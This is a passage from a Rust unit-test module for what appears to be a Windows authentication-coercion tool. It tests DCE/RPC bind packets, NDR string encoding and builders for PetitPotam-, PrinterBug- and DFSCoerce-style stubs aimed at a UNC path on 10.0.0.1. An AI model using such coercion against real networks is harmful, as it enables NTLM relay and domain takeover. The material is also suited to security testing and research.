        assert_eq!(bind[0], 5);
        assert_eq!(bind[2], 11);
        assert_eq!(bind[3], 3);
    }

    #[test]
    fn test_tcp_request_structure() {
        let req = build_tcp_request(0, &[0u8; 10]);
        assert_eq!(req[0], 5);
        assert_eq!(req[2], 0);
        assert_eq!(req[3], 3);
    }

    #[test]
    fn test_ndr_string_tcp_encoding() {
        let encoded = ndr_string_tcp("\\\\server\\share");
        assert!(!encoded.is_empty());
        assert!(encoded.windows(2).any(|w| w == [b'\\', 0]));
    }

    #[test]
    fn test_ndr_string_tcp_empty() {
        let encoded = ndr_string_tcp("");
        assert_eq!(encoded.len() % 4, 0, "NDR strings must be 4-byte aligned");
        assert!(encoded.len() >= 12, "Empty NDR string = 3 u32 headers");
    }

    #[test]
    fn test_ndr_string_tcp_unicode() {
        let encoded = ndr_string_tcp("héllo");
        assert_eq!(encoded.len() % 4, 0);
        assert!(
            encoded.windows(2).any(|w| w == [0xe9, 0x00]),
            "Should contain UTF-16 encoded é"
        );
    }

    #[test]
    fn test_ndr_string_tcp_4byte_aligned() {
        for s in &["a", "ab", "abc", "abcd", "héllo_world_test"] {
            let encoded = ndr_string_tcp(s);
            assert_eq!(
                encoded.len() % 4,
                0,
                "NDR string '{}' length {} not 4-byte aligned",
                s,
                encoded.len()
            );
        }
    }

    #[test]
    fn test_tcp_build_efsr_deterministic() {
        let a = build_efsr_open_file_raw_tcp("\\\\10.0.0.1\\share");
        let b = build_efsr_open_file_raw_tcp("\\\\10.0.0.1\\share");
        assert_eq!(a, b, "Same input should produce identical stubs");
    }

    #[test]
    fn test_tcp_build_rprn_deterministic() {
        let a = build_rprn_coerce_tcp("\\\\10.0.0.1\\share");
        let b = build_rprn_coerce_tcp("\\\\10.0.0.1\\share");
        assert_eq!(a, b, "Same input should produce identical stubs");
    }

    #[test]
    fn test_tcp_build_dfs_deterministic() {
        let a = build_dfs_coerce_tcp("\\\\10.0.0.1\\share");
        let b = build_dfs_coerce_tcp("\\\\10.0.0.1\\share");
        assert_eq!(a, b, "Same input should produce identical stubs");
    }

    #[test]
    fn test_is_bind_accepted_tcp_rejects_short() {
        assert!(!is_bind_accepted_tcp(&[0u8; 20]));
        assert!(!is_bind_accepted_tcp(&[0u8; 30]));
    }

    #[test]
    fn test_is_bind_accepted_tcp_accepts_valid() {
        let mut resp = vec![0u8; 32];
        resp[28] = 0;
        resp[29] = 0;
        assert!(is_bind_accepted_tcp(&resp));
    }

    #[test]
    fn test_is_bind_accepted_tcp_rejects_reject() {
        let mut resp = vec![0u8; 32];
        resp[28] = 0x02;
        resp[29] = 0x00;
        assert!(!is_bind_accepted_tcp(&resp));
    }
}
